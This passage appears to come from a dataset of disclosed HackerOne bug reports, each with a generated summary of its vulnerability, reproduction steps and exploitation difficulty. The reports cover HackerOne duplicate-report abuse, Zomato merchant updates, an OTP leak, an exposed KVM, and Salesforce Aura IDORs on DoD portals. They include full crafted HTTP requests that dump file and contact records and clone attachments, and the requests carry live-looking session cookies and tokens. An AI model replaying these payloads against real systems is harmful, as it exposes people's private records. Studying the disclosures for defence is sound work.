17Content-Length: 289
18Origin: https://hackerone.com
19Sec-Fetch-Dest: empty
20Sec-Fetch-Mode: cors
21Sec-Fetch-Site: same-origin
22Te: trailers
23
24message=s&substate=duplicate&original_report_id=███████&reference=&add_reporter_to_original=false&reply_action=close-report&mark_ineligible_for_bounty=false&unassign_report_on_close=false&code_review_patch=&code_review_diff_url=&reports_count=1&report_ids%5B%5D=<your report ID>&bounty_currency=USD
25
Here, Only replace the values which are enclosed inside <> and then forward the request. Notice that the response is 200 OK and the report is closed as duplicate of █████ which is publicly disclosed report of Hackerone program
Impact
There were many scenarios in my mind regarding impact but these are most relevant ones:
It can impact Automation Pipelines because there can be many reports and the program can mistakenly enter other report ID .
This one is just assumption but i believe its possible:
When you close a report as duplicate of other report (Original report), it will show on right side panel the reports which are duplicate of that particular report like this:
<image_0>
So my assumption is that , it might show like this to the program team in a genuine publicly disclosed report as the attacker can dupe his/her report to public report and the public report will be shown like that to the program manager or the viewers (participants or collaborators) which alternatively means it gives ability for any attacker to make other public reports look like they have duplicates but the duplicates are other reports from other program
Remaining impact, root cause and potential impacts are to be evaluated by h1 team as i am limited by my sandbox program and its privilege.



================================================================================
Vulnerability Description:
The vulnerability allows a user with Report and Engagement access to close a report as a duplicate of another program's report, potentially causing unintended associations between reports from different programs and misleading program managers about duplicate reports.

Steps to Reproduce:
1. Create a Sandbox program and invite a user with Report and Engagement access
2. As the invited user, select to close a report as a duplicate of another program's report by sending a crafted HTTP request with the target report ID
Exploitation Difficulty:
The attack involves understanding the report closing mechanism and manipulating the HTTP request to reference a report from a different program. However, the steps are straightforward once the user has the necessary access and understands the request structure.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/255651: Unauthorized update of merchants' information via /php/merchant_details.php
================================================================================
RAW DESCRIPTION:

Hello!
I discovered an interesting file :
https://www.zomato.com/php/merchant_details.php
If I add in post content :
action=update-merchant&merchant_id=95292&type=1&email=update@hotmail.fr&contact=update@hotmail.fr&name=update
With the report #255648, I was able to create a merchant, I should use this merchant to provide a screenshot like in a real situation.
I'm also able to change :
address, pincode, city, email, phone tan_number, bank account name, company_id, payu_id, contact, restaurants and more...
An attacker would change the mail to receive confidential mails it may can be leading to an merchant takeover if you use the mail to bound it with the account of the user. I couldn't try this scenario due to your rules about users data.
Do you have a test merchant_id i can play with to test that before you resolve the report?
Screenshot : updatehttp.png
If you have any questions...
nbsp



================================================================================
Vulnerability Description:
The vulnerability allows unauthorized updates to merchant information via the /php/merchant_details.php endpoint. An attacker can modify sensitive details such as email, contact information, address, and bank account details, potentially leading to a merchant account takeover.

Steps to Reproduce:
1. Identify the target endpoint: https://www.zomato.com/php/merchant_details.php
2. Send a POST request with the following parameters: action=update-merchant&merchant_id=95292&type=1&email=update@hotmail.fr&contact=update@hotmail.fr&name=update
Exploitation Difficulty:
The attack involves a straightforward manipulation of a single endpoint with clear parameters. No complex interactions or state manipulations are required, and the vulnerability is easily identifiable once the endpoint is discovered.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/2623715: Sensitive data exposure: █████████ candidate resumes/CVs available to download with no authentication through BAC/IDOR/Improper Salesforce config
================================================================================
RAW DESCRIPTION:

Greetings DoD team,
I located a major example of sensitive data exposure through a BAC/incorrectly configured Salesforce instance.
The https://█████████.experience.███/s/registration page allows the attacker to download any attachment (including thousands of resumes full of PII, university transcripts, and other sensitive files) submitted by other users through the Registration form. Potentially this might also affect files added by the ███████ team manually.
At least several files are available (possibly many more); no authentication is required for this attack.
Impact
Large-scale data breach/candidate PII leak.
System Host(s)
███████
Affected Product(s) and Version(s)
CVE Numbers
Steps to Reproduce
Steps to reproduce:
In browser, navigate to: https://███████.experience.██████/s/registration
Within Burp, find any POST request to the /aura endpoint, such as below. Send to Repeater:
Code 2.37 KiB
1POST /s/sfsites/aura?r=1&aura.ApexAction.execute=1 HTTP/1.1
2Host: ███████.experience.██████████
3Cookie: ████████; BrowserId=ztAOY0pSEe-h9wmd5-lRkA; pctrk=ccfad8a9-dcf3-4ab7-9a5f-f623cdbcd7b7
4User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
5Accept: */*
6Accept-Language: en-US,en;q=0.5
7Accept-Encoding: gzip, deflate, br
8Referer: https://████.experience.███████/s/registration
9X-Sfdc-Lds-Endpoints: ApexActionController.execute:RegistrationCtrl.getFileUploadRecord
10X-Sfdc-Page-Scope-Id: 8f4f7425-7484-4329-b975-98c3bb386cfb
11X-Sfdc-Request-Id: 326100000096dd5c96
12X-Sfdc-Page-Cache: eec50ac11c34f2f4
13Content-Type: application/x-www-form-urlencoded;charset=UTF-8
14Content-Length: 1555
15Origin: https://███.experience.████
16Dnt: 1
17Sec-Gpc: 1
18Sec-Fetch-Dest: empty
19Sec-Fetch-Mode: cors
20Sec-Fetch-Site: same-origin
21Te: trailers
22Connection: close
23
24message=%7B%22actions%22%3A%5B%7B%22id%22%3A%2298%3Ba%22%2C%22descriptor%22%3A%22aura%3A%2F%2FApexActionController%2FACTION%24execute%22%2C%22callingDescriptor%22%3A%22UNKNOWN%22%2C%22params%22%3A%7B%22namespace%22%3A%22%22%2C%22classname%22%3A%22RegistrationCtrl%22%2C%22method%22%3A%22getFileUploadRecord%22%2C%22cacheable%22%3Afalse%2C%22isContinuation%22%3Afalse%7D%7D%5D%7D&aura.context=%7B%22mode%22%3A%22PROD%22%2C%22fwuid%22%3A%22WFIwUmVJdmtIRnI3MTFpX0d6c1VwQWhZX25NdHFVdGpDN3BnWlROY1ZGT3cyNTAuOC4zLTYuNC41%22%2C%22app%22%3A%22siteforce%3AcommunityApp%22%2C%22loaded%22%3A%7B%22APPLICATION%40markup%3A%2F%2Fsiteforce%3AcommunityApp%22%3A%224aRXFMeJBEoyEhCBFKHHSA%22%2C%22COMPONENT%40markup%3A%2F%2Fforce%3AinputField%22%3A%22MIteSSSIxKghQgDJWuI57g%22%2C%22COMPONENT%40markup%3A%2F%2Fforce%3AoutputField%22%3A%224kDixPuHcKU99oJ3nGrYwA%22%2C%22COMPONENT%40markup%3A%2F%2FforceCommunity%3AfeedPublisher%22%3A%22eLdMCU5TIIj5fTlBFHu9Cg%22%2C%22COMPONENT%40markup%3A%2F%2FforceCommunity%3AforceCommunityFeed%22%3A%22T_JqvrMTIi87V9CzYeCoyQ%22%2C%22COMPONENT%40markup%3A%2F%2FforceCommunity%3AobjectHome%22%3A%22XokhHoGbTrHekjpxgyja7A%22%2C%22COMPONENT%40markup%3A%2F%2FforceCommunity%3ArecordDetail%22%3A%22DhqIX7zfLrAKT30H1SrJBQ%22%2C%22COMPONENT%40markup%3A%2F%2FforceCommunity%3ArelatedRecords%22%3A%22QKutWURpjg1wirSmIlNoOQ%22%2C%22COMPONENT%40markup%3A%2F%2Finstrumentation%3Ao11ySecondaryLoader%22%3A%221JitVv-ZC5qlK6HkuofJqQ%22%7D%2C%22dn%22%3A%5B%5D%2C%22globals%22%3A%7B%7D%2C%22uad%22%3Afalse%7D&aura.pageURI=%2Fs%2Fregistration&aura.token=null
Modify the request as follows. This is a specifically crafted Aura payload that returns 2000 ContentDocument records (uploaded files). Send to Repeater and issue request:
Code 2.37 KiB
1POST /s/sfsites/aura?r=1&aura.ApexAction.execute=1 HTTP/1.1
2Host: ███████.experience.██████
3Cookie: ██████; BrowserId=ztAOY0pSEe-h9wmd5-lRkA; pctrk=ccfad8a9-dcf3-4ab7-9a5f-f623cdbcd7b7
4User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
5Accept: */*
6Accept-Language: en-US,en;q=0.5
7Accept-Encoding: gzip, deflate, br
8Referer: https://██████.experience.███/s/registration
9X-Sfdc-Lds-Endpoints: ApexActionController.execute:RegistrationCtrl.getFileUploadRecord
10X-Sfdc-Page-Scope-Id: 8f4f7425-7484-4329-b975-98c3bb386cfb
11X-Sfdc-Request-Id: 326100000096dd5c96
12X-Sfdc-Page-Cache: eec50ac11c34f2f4
13Content-Type: application/x-www-form-urlencoded;charset=UTF-8
14Content-Length: 1554
15Origin: https://██████.experience.██████████
16Dnt: 1
17Sec-Gpc: 1
18Sec-Fetch-Dest: empty
19Sec-Fetch-Mode: cors
20Sec-Fetch-Site: same-origin
21Te: trailers
22Connection: close
23
24message={"actions":[{"id":"123;a","descriptor":"serviceComponent://ui.force.components.controllers.lists.selectableListDataProvider.SelectableListDataProviderController/ACTION$getItems","callingDescriptor":"UNKNOWN","params":{"entityNameOrId":"ContentDocument","layoutType":"FULL","pageSize":2000,"currentPage":0,"useTimeout":false,"getCount":false,"enableRowActions":false}}]}&aura.context=%7B%22mode%22%3A%22PROD%22%2C%22fwuid%22%3A%22WFIwUmVJdmtIRnI3MTFpX0d6c1VwQWhZX25NdHFVdGpDN3BnWlROY1ZGT3cyNTAuOC4zLTYuNC41%22%2C%22app%22%3A%22siteforce%3AcommunityApp%22%2C%22loaded%22%3A%7B%22APPLICATION%40markup%3A%2F%2Fsiteforce%3AcommunityApp%22%3A%224aRXFMeJBEoyEhCBFKHHSA%22%2C%22COMPONENT%40markup%3A%2F%2Fforce%3AinputField%22%3A%22MIteSSSIxKghQgDJWuI57g%22%2C%22COMPONENT%40markup%3A%2F%2Fforce%3AoutputField%22%3A%224kDixPuHcKU99oJ3nGrYwA%22%2C%22COMPONENT%40markup%3A%2F%2FforceCommunity%3AfeedPublisher%22%3A%22eLdMCU5TIIj5fTlBFHu9Cg%22%2C%22COMPONENT%40markup%3A%2F%2FforceCommunity%3AforceCommunityFeed%22%3A%22T_JqvrMTIi87V9CzYeCoyQ%22%2C%22COMPONENT%40markup%3A%2F%2FforceCommunity%3AobjectHome%22%3A%22XokhHoGbTrHekjpxgyja7A%22%2C%22COMPONENT%40markup%3A%2F%2FforceCommunity%3ArecordDetail%22%3A%22DhqIX7zfLrAKT30H1SrJBQ%22%2C%22COMPONENT%40markup%3A%2F%2FforceCommunity%3ArelatedRecords%22%3A%22QKutWURpjg1wirSmIlNoOQ%22%2C%22COMPONENT%40markup%3A%2F%2Finstrumentation%3Ao11ySecondaryLoader%22%3A%221JitVv-ZC5qlK6HkuofJqQ%22%7D%2C%22dn%22%3A%5B%5D%2C%22globals%22%3A%7B%7D%2C%22uad%22%3Afalse%7D&aura.pageURI=%2Fs%2Fregistration&aura.token=null
Extract one of the IDs from the server response, e.g. 069830000028KJdAAM
██████████
Insert this ID into URL as below. This will download the attachment (confidential candidate resume) directly. All other files can be accessed using the same method.
https://██████████.experience.██████/sfsites/c/sfc/servlet.shepherd/document/download/069830000028KJdAAM
Hope you find this report helpful - look forward to your feedback.
Suggested Mitigation/Remediation Actions



================================================================================
Vulnerability Description:
The vulnerability involves a misconfigured Salesforce instance that allows unauthenticated access to sensitive files (e.g., resumes, transcripts) uploaded by users. By crafting specific Aura requests, an attacker can retrieve and download these files without any authentication, leading to a large-scale data breach.

Steps to Reproduce:
1. Navigate to the registration page: https://█████████.experience.███/s/registration
2. Intercept a POST request to the /aura endpoint using Burp Suite and send it to Repeater
3. Modify the request to craft a specific Aura payload that retrieves ContentDocument records (uploaded files)
4. Extract a file ID from the server response and use it to construct a download URL
5. Access the file directly via the constructed URL, e.g., https://██████████.experience.██████/sfsites/c/sfc/servlet.shepherd/document/download/069830000028KJdAAM
Exploitation Difficulty:
The attack requires understanding Salesforce's Aura framework and crafting specific requests to exploit the misconfiguration. While the steps are methodical, the need to manipulate the Aura payload and understand the response structure adds complexity.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/2633888: OTP code Leaked in API Response 
================================================================================
RAW DESCRIPTION:

Summary:
The application https://corporate.admyntec.co.za allows users to sign up for device insurance. When you Get a Quote, it requires authentication via phone number. An OTP is sent to the phone number to further validate the action was initiated by the legit user. Except this same OTP code is returned in the OTP response.
Steps To Reproduce:
1.Vist https://corporate.admyntec.co.za/customerInsurance and get a quote.
2. Have a proxy interceptor tool like burpsuite running. Now enter any valid MTN number.
3. Notice the OTP code is also returned in the API's response
Impact
It's possible to sign up with other users accounts. It's possible to log into other users accounts as well.



================================================================================
Vulnerability Description:
The application leaks the OTP code in the API response during the authentication process, allowing attackers to bypass OTP validation and potentially sign up or log into other users' accounts.

Steps to Reproduce:
1. Visit https://corporate.admyntec.co.za/customerInsurance and get a quote.
2. Use a proxy interceptor tool like Burp Suite to capture the API response after entering a valid phone number. Observe the OTP code in the response.
Exploitation Difficulty:
The vulnerability is straightforward to discover as it only requires intercepting the API response during a normal OTP authentication flow. There are no complex interactions or state manipulations involved.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/2633988: DoD workstation exposed to internet via TinyPilot KVM with no authentication
================================================================================
RAW DESCRIPTION:

Description:
There appears to be a workstation belonging to ███████ (███) that is completely exposed to the internet via IP web interface by way of a TinyPilot KVM device.
TinyPilot KVMs are hardware devices that enable you to remotely access computers via IP address. This device in question is available over the internet without authentication and is connected to a workstation that appears to belong to ███. There is an "UNCLASSIFIED" green banner at the top. In the top right corner appears to be the initials "SA", which may identify the user.
Please see attached screenshot. Of note: I did not interact with the device at all. I immediately closed the connection after taking the screenshot attached to file this report. I do not know how long this device has been exposed like this. There appears to be no notification the user when this happens.
References
Read more about TinyPilot devices here: https://tinypilotkvm.com/
Impact
Simply by visiting the IP address in question, anyone on the internet can see the users screen and have full mouse/keyboard control over the workstation. An attacker could also sit and watch the user's screen to gain information.
Confidentiality: The user's entire session is exposed. Anything that appears on screen could be seen/watched by an attacker.
Integrity: An attacker could take control of the mouse/keyboard and modify the system in any way.
Availability: An attacker could take control of the mouse/keyboard and destroy files, inhibit the use of the system, etc.
System Host(s)
████████ (Comcast Cable Communications, LLC - Houston, TX)
Steps to Reproduce
Visiting https://█████ loads into the TinyPilot KVM service with no authentication and connects you to what appears to be a ███████ workstation.
Suggested Mitigation/Remediation Actions
Disconnect the workstation from TinyPilot KVM, or insure proper authentication mechanism is in place.



================================================================================
Vulnerability Description:
A workstation is exposed to the internet via a TinyPilot KVM device without any authentication, allowing anyone to view and control the workstation remotely.

Steps to Reproduce:
1. Visit the exposed IP address in a web browser.
2. Observe the TinyPilot KVM interface without any authentication prompt.
Exploitation Difficulty:
The vulnerability involves a straightforward discovery process where the tester simply visits an IP address and finds an unauthenticated KVM interface. There are no complex interactions or multiple components involved.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/2801787: Admin Dashboard Access Leads to Updating Merchant Info
================================================================================
RAW DESCRIPTION:

Summary:
The ███████ application provides access to 3(Merchant, Supervisor, Admin) classes of users. Looking at the Admin side, its clear only permitted admins can login to the portal since nothing on the UI indicates a register feature. However I was able to find a registration endpoint to sign up. Now I have access to the Admin dashboard. Based on the functionalities there, it's evident an outsider shouldn't have access to this.
Steps To Reproduce:
[add details for how we can reproduce the issue]
Visit ████████ and signup
<image_0>
<image_1>
!EDIT
Initially my report focused on the merchants, however it affects, Cashiers, Stations and Supervisors also. You can edit and delete their data also by navigating the the URLs below:
███████
█████████
█████████
IMPORTANT
<image_2>
Impact
Direct access to admin functionalities, where an attacker can modify merchant financial account information, disable and delete account of MTN clients. An outsider like myself shouldn't have access to this.



================================================================================
Vulnerability Description:
The application exposes an Admin registration endpoint that allows unauthorized users to sign up and gain access to sensitive administrative functionalities, including the ability to modify merchant financial account information, disable accounts, and delete MTN client accounts.

Steps to Reproduce:
1. Visit the application's signup endpoint (████████) and register as a new user
2. Log in with the newly created credentials to gain access to the Admin dashboard
Exploitation Difficulty:
The vulnerability involves discovering a hidden registration endpoint, which is not obvious from the UI, and exploiting it to gain unauthorized access. However, the attack itself is straightforward once the endpoint is found, with no complex interactions or state manipulations required.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/2950536: Applicant security exam Attachments/Documents accessible through an IDOR/BAC on the custom Apex controller on https://█████.mil 
================================================================================
RAW DESCRIPTION:

Greetings DoD team,
I've uncovered a highly dangerous IDOR on the ██████████ portal.
An attacker can switch the ownership of any Attachment record submitted through the portal and access the files. These contain highly sensitive information as they include all materials/documentation submitted as part of the vetting procedures prior to visiting the █████, e.g. personal medical records. Potentially this might include internal attachments as well.
An attacker is able to exploit the following chain:
Generate/enumerate a list of Salesforce Attachment Id's. These are highly predictable: example methodology/script here: https://blog.hypn.za.net/2022/11/12/Hacking-Salesforce-backed-WebApps/.
Plug the generated list of Id's into the broken Apex controller (apex://ExAM.FileUploadController/ACTION$cloneAttachment), clone any Attachment record within the CRM and link it to a record they own (e.g. their own Contact). This gives read access to the record.
Download the newly-linked Attachment as their own via a servlet/servlet.FileDownload?file=* request.
IMPORTANT NOTE: unfortunately during testing inadvertent access was gained to a confidential record (https://██████████.mil/Portal██████████/servlet/servlet.FileDownload?file=00PRw000000MaT3MAK). Please remove the link to the test Contact as a matter of urgency. Apologies!
Impact
High-impact sensitive data leak.
System Host(s)
██████.mil
Affected Product(s) and Version(s)
CVE Numbers
Steps to Reproduce
Steps to reproduce/POC
Create a new ███████ request: https://███████.mil/Portal██████/s/████████-creation
After submitting the form, verify the account by following the link received in email (Welcome to Your ████████ Reservation Portal My████s Account...)
After changing the password and logging into ██████.mil/Portal████/s/, find any POST request with aura.token present in the HTTP traffic, e.g:
Code 2.77 KiB
1POST /Portal████████/s/sfsites/aura?r=1&ui-comm-runtime-components-aura-components-siteforce-controller.PubliclyCacheableAttributeLoader.getComponentAttributes=1 HTTP/2
2Host: █████.mil
3Cookie: renderCtx=%7B%22pageId%22%3A%22fec421fb-ebfc-431f-978d-a365adcfcb5c%22%2C%22schema%22%3A%22Published%22%2C%22viewType%22%3A%22Published%22%2C%22brandingSetId%22%3A%223c2a3bc4-0bc0-4c5c-8f55-7ae185109706%22%2C%22audienceIds%22%3A%226Au83000000003R%2C6Au83000000003M%22%7D; CookieConsentPolicy=0:1; LSKey-c$CookieConsentPolicy=0:1; BrowserId=oMjkwsU6Ee-I00kJsX5jcA; pctrk=206f938e-92be-4123-812c-7636ca87745f; oinfo=c3RhdHVzPUFDVElWRSZ0eXBlPTImb2lkPTAwRHQwMDAwMDAwUE16bg==; autocomplete=1; oid=00Dt0000000PMzn; sid=00Dt0000000PMzn!AQEAQOLKvWlH87RxyW9N_gumGxPew3nc7awAoLfDbhliBEaC6HRUyzcfI0buw465cwES7za7d6WuFGxuivxJhqW4_4bM5PjI; sid_Client=w000000E5Sr0000000PMzn; clientSrc=81.97.122.40; inst=APP_Rw; __Secure-has-sid=1
4User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
5Accept: */*
6Accept-Language: en-US,en;q=0.5
7Accept-Encoding: gzip, deflate, br
8Referer: https://█████.mil/Portal█████/s/
9X-Sfdc-Page-Scope-Id: cb3e874d-dd6f-4459-8016-91cb97c034bb
10X-Sfdc-Request-Id: 1650000000ce00391b
11X-Sfdc-Page-Cache: 05da72b5c160b86c
12Content-Type: application/x-www-form-urlencoded;charset=UTF-8
13X-B3-Traceid: bb38cda3039f713b
14X-B3-Spanid: 2e48fc5f161b8aa4
15X-B3-Sampled: 0
16Content-Length: 1310
17Origin: https://█████████.mil
18Sec-Fetch-Dest: empty
19Sec-Fetch-Mode: cors
20Sec-Fetch-Site: same-origin
21Te: trailers
22
23message=%7B%22actions%22%3A%5B%7B%22id%22%3A%2294%3Ba%22%2C%22descriptor%22%3A%22serviceComponent%3A%2F%2Fui.comm.runtime.components.aura.components.siteforce.controller.PubliclyCacheableAttributeLoaderController%2FACTION%24getComponentAttributes%22%2C%22callingDescriptor%22%3A%22markup%3A%2F%2Fsiteforce%3ApageLoader%22%2C%22params%22%3A%7B%22viewOrThemeLayoutId%22%3A%22c2a69af8-e08e-4cc8-a677-d55b0ca0fa94%22%2C%22publishedChangelistNum%22%3A91%2C%22audienceKey%22%3A%22ClyOkxQ47tauZ_s9udPOFA%22%7D%2C%22version%22%3A%2262.0%22%2C%22storable%22%3Atrue%7D%5D%7D&aura.context=%7B%22mode%22%3A%22PROD%22%2C%22fwuid%22%3A%22eUNJbjV5czdoejBvRlA5OHpDU1dPd1pMVExBQkpJSlVFU29Ba3lmcUNLWlE5LjMyMC4y%22%2C%22app%22%3A%22siteforce%3AcommunityApp%22%2C%22loaded%22%3A%7B%22APPLICATION%40markup%3A%2F%2Fsiteforce%3AcommunityApp%22%3A%221184_AgcTXn_6dZSShHXZ2PZsug%22%7D%2C%22dn%22%3A%5B%5D%2C%22globals%22%3A%7B%7D%2C%22uad%22%3Atrue%7D&aura.pageURI=%2FPortal██████%2Fs%2F&aura.token=eyJub25jZSI6Ilh5VUlXTVhkNmlMLVVVSGE4UHgtNVpYcXNHTExpcHh1VHpsdGY0ZUxMX0lcdTAwM2QiLCJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6IntcInRcIjpcIjAwRFJ3MDAwMDAwMDAwMVwiLFwidlwiOlwiMDJHUncwMDAwMDAwMDNGXCIsXCJhXCI6XCJjYWltYW5zaWduZXJcIn0iLCJjcml0IjpbImlhdCJdLCJpYXQiOjE3MzczOTAwMTE5MTEsImV4cCI6MH0%3D..WK5LFyXjvujGvkxNWDVZyUQQsRhVRCcTD_hkWdulEWA%3D
Send the request to Repeater, modify as below and send. This will pull some info from your own Contact record. Save the Contact Id (003Rw000002SJcsIAG in my case)
Code 2.58 KiB
1POST /Portal█████/s/sfsites/aura?r=1&ui-comm-runtime-components-aura-components-siteforce-controller.PubliclyCacheableAttributeLoader.getComponentAttributes=1 HTTP/2
2Host: █████.mil
3Cookie: renderCtx=%7B%22pageId%22%3A%22fec421fb-ebfc-431f-978d-a365adcfcb5c%22%2C%22schema%22%3A%22Published%22%2C%22viewType%22%3A%22Published%22%2C%22brandingSetId%22%3A%223c2a3bc4-0bc0-4c5c-8f55-7ae185109706%22%2C%22audienceIds%22%3A%226Au83000000003R%2C6Au83000000003M%22%7D; CookieConsentPolicy=0:1; LSKey-c$CookieConsentPolicy=0:1; BrowserId=oMjkwsU6Ee-I00kJsX5jcA; pctrk=206f938e-92be-4123-812c-7636ca87745f; oinfo=c3RhdHVzPUFDVElWRSZ0eXBlPTImb2lkPTAwRHQwMDAwMDAwUE16bg==; autocomplete=1; oid=00Dt0000000PMzn; sid=00Dt0000000PMzn!AQEAQOLKvWlH87RxyW9N_gumGxPew3nc7awAoLfDbhliBEaC6HRUyzcfI0buw465cwES7za7d6WuFGxuivxJhqW4_4bM5PjI; sid_Client=w000000E5Sr0000000PMzn; clientSrc=81.97.122.40; inst=APP_Rw; __Secure-has-sid=1
4User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
5Accept: */*
6Accept-Language: en-US,en;q=0.5
7Accept-Encoding: gzip, deflate, br
8Referer: https://█████.mil/Portal█████████/s/
9X-Sfdc-Page-Scope-Id: cb3e874d-dd6f-4459-8016-91cb97c034bb
10X-Sfdc-Request-Id: 1650000000ce00391b
11X-Sfdc-Page-Cache: 05da72b5c160b86c
12Content-Type: application/x-www-form-urlencoded;charset=UTF-8
13X-B3-Traceid: bb38cda3039f713b
14X-B3-Spanid: 2e48fc5f161b8aa4
15X-B3-Sampled: 0
16Content-Length: 1115
17Origin: https://██████.mil
18Sec-Fetch-Dest: empty
19Sec-Fetch-Mode: cors
20Sec-Fetch-Site: same-origin
21Te: trailers
22
23message={"actions":[{"id":"123;a","descriptor":"serviceComponent://ui.force.components.controllers.lists.selectableListDataProvider.SelectableListDataProviderController/ACTION$getItems","callingDescriptor":"UNKNOWN","params":{"entityNameOrId":"Contact","layoutType":"FULL","pageSize":2000,"currentPage":0,"useTimeout":false,"getCount":false,"enableRowActions":false}}]}&aura.context=%7B%22mode%22%3A%22PROD%22%2C%22fwuid%22%3A%22eUNJbjV5czdoejBvRlA5OHpDU1dPd1pMVExBQkpJSlVFU29Ba3lmcUNLWlE5LjMyMC4y%22%2C%22app%22%3A%22siteforce%3AcommunityApp%22%2C%22loaded%22%3A%7B%22APPLICATION%40markup%3A%2F%2Fsiteforce%3AcommunityApp%22%3A%221184_AgcTXn_6dZSShHXZ2PZsug%22%7D%2C%22dn%22%3A%5B%5D%2C%22globals%22%3A%7B%7D%2C%22uad%22%3Atrue%7D&aura.pageURI=%2FPortal██████████%2Fs%2F&aura.token=eyJub25jZSI6Ilh5VUlXTVhkNmlMLVVVSGE4UHgtNVpYcXNHTExpcHh1VHpsdGY0ZUxMX0lcdTAwM2QiLCJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6IntcInRcIjpcIjAwRFJ3MDAwMDAwMDAwMVwiLFwidlwiOlwiMDJHUncwMDAwMDAwMDNGXCIsXCJhXCI6XCJjYWltYW5zaWduZXJcIn0iLCJjcml0IjpbImlhdCJdLCJpYXQiOjE3MzczOTAwMTE5MTEsImV4cCI6MH0%3D..WK5LFyXjvujGvkxNWDVZyUQQsRhVRCcTD_hkWdulEWA%3D
█████████
Modify the request again as below, setting the value of parentId as as your Contact Id extracted in previous step and attachmentId as 00PRw000000MaT3MAK:
Code 2.47 KiB
1POST /Portal█████████/s/sfsites/aura?r=1&ui-comm-runtime-components-aura-components-siteforce-controller.PubliclyCacheableAttributeLoader.getComponentAttributes=1 HTTP/2
2Host: █████.mil
3Cookie: renderCtx=%7B%22pageId%22%3A%22fec421fb-ebfc-431f-978d-a365adcfcb5c%22%2C%22schema%22%3A%22Published%22%2C%22viewType%22%3A%22Published%22%2C%22brandingSetId%22%3A%223c2a3bc4-0bc0-4c5c-8f55-7ae185109706%22%2C%22audienceIds%22%3A%226Au83000000003R%2C6Au83000000003M%22%7D; CookieConsentPolicy=0:1; LSKey-c$CookieConsentPolicy=0:1; BrowserId=oMjkwsU6Ee-I00kJsX5jcA; pctrk=206f938e-92be-4123-812c-7636ca87745f; oinfo=c3RhdHVzPUFDVElWRSZ0eXBlPTImb2lkPTAwRHQwMDAwMDAwUE16bg==; autocomplete=1; oid=00Dt0000000PMzn; sid=00Dt0000000PMzn!AQEAQOLKvWlH87RxyW9N_gumGxPew3nc7awAoLfDbhliBEaC6HRUyzcfI0buw465cwES7za7d6WuFGxuivxJhqW4_4bM5PjI; sid_Client=w000000E5Sr0000000PMzn; clientSrc=81.97.122.40; inst=APP_Rw; __Secure-has-sid=1
4User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
5Accept: */*
6Accept-Language: en-US,en;q=0.5
7Accept-Encoding: gzip, deflate, br
8Referer: https://███████.mil/Portal███████/s/
9X-Sfdc-Page-Scope-Id: cb3e874d-dd6f-4459-8016-91cb97c034bb
10X-Sfdc-Request-Id: 1650000000ce00391b
11X-Sfdc-Page-Cache: 05da72b5c160b86c
12Content-Type: application/x-www-form-urlencoded;charset=UTF-8
13X-B3-Traceid: bb38cda3039f713b
14X-B3-Spanid: 2e48fc5f161b8aa4
15X-B3-Sampled: 0
16Content-Length: 999
17Origin: https://███████.mil
18Sec-Fetch-Dest: empty
19Sec-Fetch-Mode: cors
20Sec-Fetch-Site: same-origin
21Te: trailers
22
23message={"actions":[{"id":"20;a","descriptor":"apex://ExAM.FileUploadController/ACTION$cloneAttachment","callingDescriptor":"markup://ExAM:AssessmentViewer","params":{"attachmentId":"00PRw000000MaT3MAK","parentId":"003Rw000002SJcsIAG"},"version":null}]}&aura.context=%7B%22mode%22%3A%22PROD%22%2C%22fwuid%22%3A%22eUNJbjV5czdoejBvRlA5OHpDU1dPd1pMVExBQkpJSlVFU29Ba3lmcUNLWlE5LjMyMC4y%22%2C%22app%22%3A%22siteforce%3AcommunityApp%22%2C%22loaded%22%3A%7B%22APPLICATION%40markup%3A%2F%2Fsiteforce%3AcommunityApp%22%3A%221184_AgcTXn_6dZSShHXZ2PZsug%22%7D%2C%22dn%22%3A%5B%5D%2C%22globals%22%3A%7B%7D%2C%22uad%22%3Atrue%7D&aura.pageURI=%2FPortal█████████%2Fs%2F&aura.token=eyJub25jZSI6Ilh5VUlXTVhkNmlMLVVVSGE4UHgtNVpYcXNHTExpcHh1VHpsdGY0ZUxMX0lcdTAwM2QiLCJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6IntcInRcIjpcIjAwRFJ3MDAwMDAwMDAwMVwiLFwidlwiOlwiMDJHUncwMDAwMDAwMDNGXCIsXCJhXCI6XCJjYWltYW5zaWduZXJcIn0iLCJjcml0IjpbImlhdCJdLCJpYXQiOjE3MzczOTAwMTE5MTEsImV4cCI6MH0%3D..WK5LFyXjvujGvkxNWDVZyUQQsRhVRCcTD_hkWdulEWA%3D
█████
Modify request again and send, this time calling all accessible Attachment records. Note that a new file has just been cloned/created, copy the Id: 00PRw000000MbSLMA0.
Code 2.58 KiB
1POST /Portal████████/s/sfsites/aura?r=1&ui-comm-runtime-components-aura-components-siteforce-controller.PubliclyCacheableAttributeLoader.getComponentAttributes=1 HTTP/2
2Host: ██████.mil
